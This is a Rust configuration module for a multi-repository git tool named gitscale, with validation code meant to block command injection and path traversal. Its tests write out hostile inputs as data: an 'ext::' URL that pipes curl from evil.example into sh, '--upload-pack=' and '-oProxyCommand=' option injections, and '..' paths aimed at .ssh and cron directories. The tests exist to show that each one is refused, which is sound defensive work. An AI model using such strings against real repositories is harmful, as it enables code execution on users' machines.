use anyhow::{bail, Context, Result};
use serde::Deserialize;
use std::collections::BTreeMap;
use std::fmt;
use std::path::{Component, Path, PathBuf};

pub const CONFIG_FILENAME: &str = ".gitscale.toml";

#[derive(Debug, Clone, Copy, PartialEq, Eq, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum RepoMode {
    Readonly,
    Readwrite,
    Artefact,
}

impl fmt::Display for RepoMode {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            RepoMode::Readonly => write!(f, "readonly"),
            RepoMode::Readwrite => write!(f, "readwrite"),
            RepoMode::Artefact => write!(f, "artefact"),
        }
    }
}

impl RepoMode {
    pub fn from_str_checked(s: &str) -> Result<Self> {
        match s {
            "readonly" => Ok(RepoMode::Readonly),
            "readwrite" => Ok(RepoMode::Readwrite),
            "artefact" => Ok(RepoMode::Artefact),
            _ => bail!(
                "invalid mode '{}', expected one of: readonly, readwrite, artefact",
                s
            ),
        }
    }
}

#[derive(Debug, Clone)]
pub struct RepoEntry {
    pub directory: String,
    pub repo_url: String,
    pub revision: String,
    pub mode: RepoMode,
    pub recursive: bool,
}

impl RepoEntry {
    pub fn is_readonly(&self) -> bool {
        matches!(self.mode, RepoMode::Readonly | RepoMode::Artefact)
    }

    pub fn is_artefact(&self) -> bool {
        matches!(self.mode, RepoMode::Artefact)
    }
}

/// What a git-hook-triggered pull should do when it fails.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum OnHookError {
    /// Return non-zero, failing the git operation that triggered the hook.
    Fail,
    /// Report on stderr but let the git operation succeed.
    Warn,
}

impl OnHookError {
    /// The spelling `[hooks].on_pull_error` accepts, so a config that is read
    /// and written back keeps the value it had.
    pub fn as_str(self) -> &'static str {
        match self {
            Self::Fail => "fail",
            Self::Warn => "warn",
        }
    }

    /// Unconfigured, CI fails fast; interactive use only warns, so a broken
    /// pull cannot make unrelated `git checkout` calls look like failures.
    pub fn resolved(configured: Option<Self>) -> Self {
        configured.unwrap_or(if crate::git::is_ci() {
            Self::Fail
        } else {
            Self::Warn
        })
    }
}

#[derive(Debug, Clone, Default)]
pub struct Hooks {
    pub post_sync: Option<String>,
    pub on_pull_error: Option<OnHookError>,
}

/// How a clone may reuse a copy of a sub-repository already on this machine.
#[derive(Debug, Clone, Default)]
pub struct Share {
    /// Copy borrowed objects in and drop the link once the clone is made.
    ///
    /// Off by default: borrowing is what saves the disk, and the workspace
    /// borrowed from is normally the long-lived one. Turn it on where the
    /// source may be pruned, moved or garbage-collected out from under the
    /// clones — `git gc` there can delete objects only a borrower still
    /// needs, and nothing warns when it does.
    pub dissociate: bool,
}

/// Which untracked files `gitscale clean` keeps.
///
/// Scoped to the repo whose config it appears in, and nothing below it: a
/// sub-repository knows its own build outputs and local scaffolding, so it
/// declares them in its own `.gitscale.toml` rather than having the root
/// enumerate them on its behalf.
#[derive(Debug, Clone, Default)]
pub struct Clean {
    /// gitignore-syntax patterns, anchored at this repo's root. Passed to
    /// `git clean -e` unchanged, so a pattern means exactly what the same
    /// text on a `.gitignore` line would.
    pub exclude: Vec<String>,
}

#[derive(Debug, Clone, Default)]
pub struct GitScaleConfig {
    pub repos: Vec<RepoEntry>,
    pub storage_url: String,
    pub hooks: Hooks,
    pub share: Share,
    pub clean: Clean,
}

#[derive(Deserialize)]
struct RawConfig {
    storage: Option<RawStorage>,
    repos: Option<BTreeMap<String, RawRepo>>,
    hooks: Option<RawHooks>,
    share: Option<RawShare>,
    clean: Option<RawClean>,
}

#[derive(Deserialize)]
struct RawClean {
    exclude: Option<Vec<String>>,
}

#[derive(Deserialize)]
struct RawShare {
    dissociate: Option<bool>,
}

#[derive(Deserialize)]
struct RawHooks {
    post_sync: Option<String>,
    on_pull_error: Option<String>,
}

#[derive(Deserialize)]
struct RawStorage {
    url: Option<String>,
}

#[derive(Deserialize)]
struct RawRepo {
    url: Option<String>,
    revision: Option<String>,
    mode: Option<String>,
    recursive: Option<bool>,
}

pub fn find_config(start: Option<&Path>) -> Result<PathBuf> {
    let mut current = match start {
        Some(p) => p.canonicalize().context("cannot resolve start path")?,
        None => std::env::current_dir().context("cannot get current directory")?,
    };
    loop {
        let candidate = current.join(CONFIG_FILENAME);
        if candidate.is_file() {
            return Ok(candidate);
        }
        if !current.pop() {
            break;
        }
    }
    bail!(
        "No {} config found (searched upward from {})",
        CONFIG_FILENAME,
        start.unwrap_or(Path::new(".")).display()
    );
}

pub fn load_config(config_path: &Path) -> Result<GitScaleConfig> {
    let text = std::fs::read_to_string(config_path)
        .with_context(|| format!("cannot read {}", config_path.display()))?;
    let raw: RawConfig = toml::from_str(&text)
        .with_context(|| format!("{}: invalid TOML", config_path.display()))?;

    let storage_url = parse_storage(raw.storage.as_ref(), config_path)?;
    let repos = parse_repos(raw.repos.as_ref(), config_path)?;
    let hooks = parse_hooks(raw.hooks.as_ref(), config_path)?;
    let share = Share {
        dissociate: raw
            .share
            .as_ref()
            .and_then(|s| s.dissociate)
            .unwrap_or(false),
    };

    let clean = parse_clean(raw.clean.as_ref(), config_path)?;

    Ok(GitScaleConfig {
        repos,
        storage_url,
        hooks,
        share,
        clean,
    })
}

pub fn load_config_optional(config_path: &Path) -> Option<GitScaleConfig> {
    if !config_path.is_file() {
        return None;
    }
    load_config(config_path).ok()
}

// ---------------------------------------------------------------------------
// Validation
//
// `.gitscale.toml` travels inside the repository, so every value below arrives
// from whoever wrote the checked-out branch. These checks exist because git
// treats some strings as instructions rather than data — see also the hook
// allowlist in `crate::trust`, which covers the `[hooks]` table.
// ---------------------------------------------------------------------------

/// The remote-helper prefix of a URL, if it has one.
///
/// `ext::sh -c 'payload'` runs the rest of the string as a command, so a bare
/// repo URL is enough for code execution — no hooks needed. Helper names are
/// bare words, so anything containing a path separator is a URL that merely
/// happens to hold a `::` (an IPv6 literal, say) and is left alone.
fn remote_helper_prefix(url: &str) -> Option<&str> {
    let scheme = &url[..url.find("::")?];
    let bare_word = !scheme.is_empty()
        && scheme
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '+' | '.' | '-'));
    bare_word.then_some(scheme)
}

/// Reject a value git would parse as an option rather than as itself. A URL or
/// revision starting with `-` reaches git as `--upload-pack=…` and similar.
fn check_not_option_like(value: &str, what: &str, config_path: &Path) -> Result<()> {
    if value.starts_with('-') {
        bail!(
            "{}: {} \"{}\" starts with '-', which git would read as a command-line option",
            config_path.display(),
            what,
            value
        );
    }
    Ok(())
}

fn check_url(url: &str, what: &str, config_path: &Path) -> Result<()> {
    check_not_option_like(url, what, config_path)?;
    if let Some(helper) = remote_helper_prefix(url) {
        bail!(
            "{}: {} \"{}\" uses the '{}::' remote helper, which gitscale refuses to run \
             (a helper such as 'ext::' executes the rest of the URL as a command)",
            config_path.display(),
            what,
            url,
            helper
        );
    }
    Ok(())
}

/// A checkout directory must stay inside the workspace: the config decides
/// where clones land, and `../..` would let it write anywhere the user can.
fn check_directory(directory: &str, config_path: &Path) -> Result<()> {
    let path = Path::new(directory);
    if directory.is_empty() {
        bail!(
            "{}: a repo directory cannot be empty",
            config_path.display()
        );
    }
    if path.is_absolute() {
        bail!(
            "{}: repo directory \"{}\" must be relative to the config, not absolute",
            config_path.display(),
            directory
        );
    }
    if path.components().any(|c| c == Component::ParentDir) {
        bail!(
            "{}: repo directory \"{}\" escapes the workspace with '..'",
            config_path.display(),
            directory
        );
    }
    Ok(())
}

fn parse_storage(raw: Option<&RawStorage>, config_path: &Path) -> Result<String> {
    let Some(storage) = raw else {
        return Ok(String::new());
    };
    match &storage.url {
        Some(u) if !u.is_empty() => {
            check_url(u, "storage.url", config_path)?;
            Ok(u.trim_end_matches('/').to_string())
        }
        _ => bail!("{}: storage.url is required", config_path.display()),
    }
}

/// `[clean] exclude`. Patterns reach `git clean -e` as arguments, so one
/// starting with `-` would arrive as a flag rather than as a pattern — the
/// same hazard `check_not_option_like` covers for URLs and revisions.
fn parse_clean(raw: Option<&RawClean>, config_path: &Path) -> Result<Clean> {
    let Some(clean) = raw else {
        return Ok(Clean::default());
    };
    let exclude = clean.exclude.clone().unwrap_or_default();
    for pattern in &exclude {
        if pattern.is_empty() {
            bail!(
                "{}: clean.exclude contains an empty pattern",
                config_path.display()
            );
        }
        check_not_option_like(pattern, "clean.exclude entry", config_path)?;
    }
    Ok(Clean { exclude })
}

fn parse_repos(
    raw: Option<&BTreeMap<String, RawRepo>>,
    config_path: &Path,
) -> Result<Vec<RepoEntry>> {
    let Some(repos) = raw else {
        return Ok(Vec::new());
    };
    let mut entries = Vec::new();
    for (directory, spec) in repos {
        check_directory(directory, config_path)?;
        let url = spec
            .url
            .as_deref()
            .filter(|u| !u.is_empty())
            .ok_or_else(|| {
                anyhow::anyhow!(
                    "{}: repos.{}.url is required",
                    config_path.display(),
                    directory
                )
            })?;

        check_url(url, &format!("repos.{}.url", directory), config_path)?;

        let revision = spec.revision.clone().unwrap_or_default();
        check_not_option_like(
            &revision,
            &format!("repos.{}.revision", directory),
            config_path,
        )?;

        let mode = match &spec.mode {
            Some(m) => RepoMode::from_str_checked(m)
                .with_context(|| format!("{}: repos.{}.mode", config_path.display(), directory))?,
            None => RepoMode::Readwrite,
        };

        let recursive = spec.recursive.unwrap_or(true);

        entries.push(RepoEntry {
            directory: directory.clone(),
            repo_url: url.to_string(),
            revision,
            mode,
            recursive,
        });
    }
    Ok(entries)
}

fn parse_hooks(raw: Option<&RawHooks>, config_path: &Path) -> Result<Hooks> {
    let Some(hooks) = raw else {
        return Ok(Hooks::default());
    };
    let on_pull_error = match hooks.on_pull_error.as_deref() {
        None => None,
        Some("fail") => Some(OnHookError::Fail),
        Some("warn") => Some(OnHookError::Warn),
        Some(other) => bail!(
            "{}: invalid hooks.on_pull_error '{}' (expected \"fail\" or \"warn\")",
            config_path.display(),
            other
        ),
    };
    Ok(Hooks {
        post_sync: hooks.post_sync.clone(),
        on_pull_error,
    })
}

/// Render a value as a TOML basic string.
///
/// Nothing here is validated against quoting: a `post_sync` command is an
/// arbitrary shell line, and `check_url` rejects option-like and remote-helper
/// URLs without caring about quotes. Emitting any of them raw would produce a
/// file that no longer parses — silently losing the rest of the config on the
/// next read.
fn toml_string(value: &str) -> String {
    let mut out = String::with_capacity(value.len() + 2);
    out.push('"');
    for c in value.chars() {
        match c {
            '"' => out.push_str("\\\""),
            '\\' => out.push_str("\\\\"),
            '\n' => out.push_str("\\n"),
            '\r' => out.push_str("\\r"),
            '\t' => out.push_str("\\t"),
            '\u{8}' => out.push_str("\\b"),
            '\u{c}' => out.push_str("\\f"),
            // Remaining control characters have no short escape and are
            // illegal bare in a basic string.
            c if (c as u32) < 0x20 || c == '\u{7f}' => {
                out.push_str(&format!("\\u{:04X}", c as u32))
            }
            c => out.push(c),
        }
    }
    out.push('"');
    out
}

/// Rewrite the config file from `config`.
///
/// Takes the whole config rather than the parts a caller happens to be
/// changing: this replaces the file wholesale, so every table it does not
/// write is a table it deletes.
pub fn write_config(config_path: &Path, config: &GitScaleConfig) -> Result<()> {
    let mut lines: Vec<String> = Vec::new();

    if config.share.dissociate {
        lines.push("[share]".to_string());
        lines.push("dissociate = true".to_string());
        lines.push(String::new());
    }

    if !config.storage_url.is_empty() {
        lines.push("[storage]".to_string());
        lines.push(format!("url = {}", toml_string(&config.storage_url)));
        lines.push(String::new());
    }

    if config.hooks.post_sync.is_some() || config.hooks.on_pull_error.is_some() {
        lines.push("[hooks]".to_string());
        if let Some(cmd) = &config.hooks.post_sync {
            lines.push(format!("post_sync = {}", toml_string(cmd)));
        }
        if let Some(policy) = config.hooks.on_pull_error {
            lines.push(format!("on_pull_error = {}", toml_string(policy.as_str())));
        }
        lines.push(String::new());
    }

    if !config.clean.exclude.is_empty() {
        lines.push("[clean]".to_string());
        let patterns: Vec<String> = config
            .clean
            .exclude
            .iter()
            .map(|p| toml_string(p))
            .collect();
        lines.push(format!("exclude = [{}]", patterns.join(", ")));
        lines.push(String::new());
    }

    if !config.repos.is_empty() {
        lines.push("[repos]".to_string());
        for entry in &config.repos {
            let mut parts = vec![format!("url = {}", toml_string(&entry.repo_url))];
            if !entry.revision.is_empty() {
                parts.push(format!("revision = {}", toml_string(&entry.revision)));
            }
            if entry.mode != RepoMode::Readwrite {
                parts.push(format!("mode = {}", toml_string(&entry.mode.to_string())));
            }
            if !entry.recursive {
                parts.push("recursive = false".to_string());
            }
            let inline = parts.join(", ");
            lines.push(format!(
                "{} = {{ {} }}",
                toml_string(&entry.directory),
                inline
            ));
        }
    }

    lines.push(String::new()); // trailing newline
    std::fs::write(config_path, lines.join("\n"))
        .with_context(|| format!("cannot write {}", config_path.display()))?;
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Tests run in parallel in one process, so each config gets its own
    /// directory rather than sharing a path.
    fn load(text: &str) -> Result<GitScaleConfig> {
        use std::sync::atomic::{AtomicUsize, Ordering};
        static SEQ: AtomicUsize = AtomicUsize::new(0);
        let dir = std::env::temp_dir().join(format!(
            "gitscale-cfg-{}-{}",
            std::process::id(),
            SEQ.fetch_add(1, Ordering::Relaxed)
        ));
        std::fs::create_dir_all(&dir).unwrap();
        let path = dir.join(CONFIG_FILENAME);
        std::fs::write(&path, text).unwrap();
        let result = load_config(&path);
        let _ = std::fs::remove_dir_all(&dir);
        result
    }

    #[test]
    fn ordinary_urls_still_load() {
        let config = load(
            r#"
[storage]
url = "https://storage.example.com/bucket"

[repos]
"libs/a" = { url = "git@github.com:thepartly/a.git", revision = "main" }
"libs/b" = { url = "https://github.com/thepartly/b.git", revision = "v1.2.3" }
"libs/c" = { url = "/srv/mirrors/c.git", revision = "main" }
"#,
        )
        .expect("a normal config should load");
        assert_eq!(config.repos.len(), 3);
    }

    #[test]
    fn remote_helper_urls_are_refused() {
        // `ext::` runs the rest of the URL as a command: code execution from a
        // repo URL alone, with no [hooks] table in sight.
        let err = load(
            r#"[repos]
"libs/a" = { url = "ext::sh -c 'curl https://evil.example/p | sh'", revision = "main" }
"#,
        )
        .unwrap_err()
        .to_string();
        assert!(err.contains("remote helper"), "{}", err);

        assert!(load("[repos]\n\"a\" = { url = \"fd::7\", revision = \"main\" }\n").is_err());
    }

    #[test]
    fn urls_containing_a_double_colon_are_left_alone() {
        // Only a bare-word prefix is a helper; these are ordinary URLs.
        assert!(remote_helper_prefix("https://[::1]:8080/a/b.git").is_none());
        assert!(remote_helper_prefix("https://example.com/a::b.git").is_none());
        assert!(remote_helper_prefix("ext::sh -c payload") == Some("ext"));
    }

    #[test]
    fn option_like_values_are_refused() {
        // git would read these as flags — `--upload-pack=` is a shell in disguise.
        assert!(load("[repos]\n\"a\" = { url = \"--upload-pack=payload\" }\n").is_err());
        assert!(load(
            "[repos]\n\"a\" = { url = \"https://example.com/a.git\", revision = \"--exec=payload\" }\n"
        )
        .is_err());
        assert!(load("[storage]\nurl = \"-oProxyCommand=payload\"\n").is_err());
    }

    #[test]
    fn directories_must_stay_inside_the_workspace() {
        assert!(load(
            "[repos]\n\"../../../home/dev/.ssh\" = { url = \"https://example.com/a.git\" }\n"
        )
        .is_err());
        assert!(
            load("[repos]\n\"/etc/cron.d\" = { url = \"https://example.com/a.git\" }\n").is_err()
        );
        // A `..` in the middle escapes just as well as one at the front.
        assert!(
            load("[repos]\n\"libs/../../x\" = { url = \"https://example.com/a.git\" }\n").is_err()
        );
    }
}
